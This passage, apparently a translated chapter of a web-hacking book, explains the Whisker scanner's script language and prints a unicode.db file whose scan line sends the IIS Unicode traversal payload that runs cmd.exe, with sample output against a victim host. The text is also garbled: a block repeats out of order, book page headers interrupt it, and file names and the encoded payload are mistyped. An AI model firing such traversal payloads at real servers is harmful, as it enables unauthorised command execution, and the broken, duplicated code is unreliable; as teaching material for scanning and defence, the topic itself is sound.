
`array Unicode = scripts,iisamples,iisadmin,iishelp, cgi-bin, msadc,_vti_bin, certsrv,certcontrol,certenroll`

# scans

print 正在检查 IIS Unicode 文件系统遍历的变体

# 第 3 章：破解 Web 服务器 83

print 如果收到 200，则目标可能受到 Unicode 漏洞的影响
`scan (iis) @Unicode / >> ..%c%0af../winnt/system32/cmd.exe/c+dir`

当你使用 Whisker Perl 引擎对有漏洞的服务器运行此代码时，会发生以下情况：

```
test>whisker.pl -h www.victim.com -s unicode.db

-- whisker / v1.4.0 / rain forest puppy // www.wiretrip.net
```

```
= - - - =
= Host: www.victim.com
= Server: Microsoft-IIS/5.0
```

检查 IIS Unicode 文件系统遍历的变体
如果收到 200，则目标可能受到 Unicode 漏洞的影响
+ 200 OK: GET /whisker.ida
+ 200 OK: GET /whisker.idq
+ 200 OK: HEAD /vti_inf.html
+ 200 OK: HEAD /vti_bin/shtml.dll
+ 200 OK: HEAD /vti_bin/shtml.exe
+ 200 OK: GET /scripts/%c%0af../winnt/system32/cmd.exe/c+dir
+ 200 OK: GET /whisker
+ 200 OK: GET /whisker.idq
+ 200 OK: HEAD /vti_inf.html
+ 200 OK: HEAD /vti_bin/shtml.dll
+ 200 OK: HEAD /vti_bin/shtml.exe
+ 200 OK: GET /%c%0af../winnt/system32/cmd.exe

通过检查此示例的输出，你可以看到 Whisker 已经识别了该 IIS 5 系统上的几个危险细节，以及与 `.ida` 和 `.idq` 文件对应的 ISAPI 过滤器（`whisker` 和 `whisker.idq` 的结果只是占位符，表示该服务器会对此类文件的请求做出响应）。再次，这是 Whisker 引擎的核心——它检查是否存在已知安全漏洞的文件，就像大多数 CGI 扫描器一样。

Whisker 的强大之处在于其易于学习脚本数据库语言，该语言由工具自带的 `whisker.txt` 文件描述。使用该语言编写自定义脚本数据库非常简单，它围绕两个核心概念构建：数组（`arrays`）和扫描（`scans`）。

数组是一个用于检查是否存在某个文件的目录列表。一个名为“roots”的数组由目录（Web 根目录）、脚本、`cgi-bin`、`iisadmin`、`iishelp` 组成，创建方式如下：

```
array roots = /,scripts, cgi-bin, iisadmin, iishelp
```

在脚本数据库中，可以使用 `@array_name` 语法引用数组，并对其进行嵌套，仅需几行代码即可指定极其复杂的目录结构。

`scan` 指令指示 Whisker 引擎搜索指定的数组以寻找特定的文件名。接上之前的例子，如果你想扫描“roots”数组以检查是否存在 `my.cy`，将使用以下语法：

```
scan ( ) @roots >> default.asp
```

要将扫描限制在 HTTP 头返回字符串 "IIS/5.0" 的系统上，可以像这样添加到扫描语法中：

```
scan (IIS/5.0) @roots >> default.asp
```

## 破解 Web 应用程序

因此，若要在服务器网络中的 `/scripts`、`cgi-bin`、`iisadmin` 和 `/ishop` 目录中搜索是否存在 `default.asp` 文件，你需要创建一个扫描配置文件，如下：

```
array roots = /scripts, cgi-bin, iisadmin, iishelp

scan (IIS/5.0) @roots >> default.asp
```

我们将此文件命名为 `whisker.db`，用它扫描存储在 `files.txt` 中的目标 IP 地址，并将输出重定向到文件 `output.txt`。这是 Whisker 的命令行：

```
whisker.pl -H hosts.txt -s whisisisker.db -iv -l output.txt
```

脚本数据库语言具有许多我们未讨论的能力，包括对一组内部变量执行 `/if` 逻辑、评估 HTTP 返回值等。凭借一点创意和对常见 Web 服务器目录结构的了解，可以通过 `.db` 文件将 Whisker 扩展为强大且灵活的扫描工具。例如，这里有一个示例 `.db` 文件，可检查 IIS Unicode 文件系统遍历漏洞的一种变体是否存在：

```
#Unicode.db 由 Joel Scambray 01-05-02

# 基于 RFP 的 whisker 开发

# 如果你想在任何点停止扫描器，请插入 "exitall" 命令

# 如果你想在任何点插入 Perl，请使用：

# eval

#[perl code...n#endev
```

```
# 所有用户变量和全局变量都在 %D 中

***查看随 whisker 附的 whisker.txt 命令参考***

globals

***********

# 如果扫描需要，将默认方法更改为 GET - 使用 usepost 切换到其他方法，

# 并使用 restoremeth 默认值

set XXMeth = GET

set XXVer = HTTP/1.0

set XXVerbose = 1
```

```
arrays

***********

array Unicode = scripts,iisamples,iisadmin,iishelp, cgi-bin, msadc,_vti_bin, certsrv,certcontrol,certenroll
```

```
# scans

***********

print 正在检查 IIS Unicode 文件系统遍历的变体
```

# 第 3 章：破解 Web 服务器 83

print 如果收到 200，则目标可能受到 Unicode 漏洞的影响
`scan (iis) @Unicode / >> ..%c%0af../winnt/system32/cmd.exe/c+dir`

当你使用 Whisker Perl 引擎对有漏洞的服务器运行此代码时，会发生以下情况：

```
test>whisker.pl -h www.victim.com -s unicode.db

-- whisker / v1.4.0 / rain forest puppy // www.wiretrip.net
```

```
= - - - =
= Host: www.victim.com
= Server: Microsoft-IIS/5.0
```
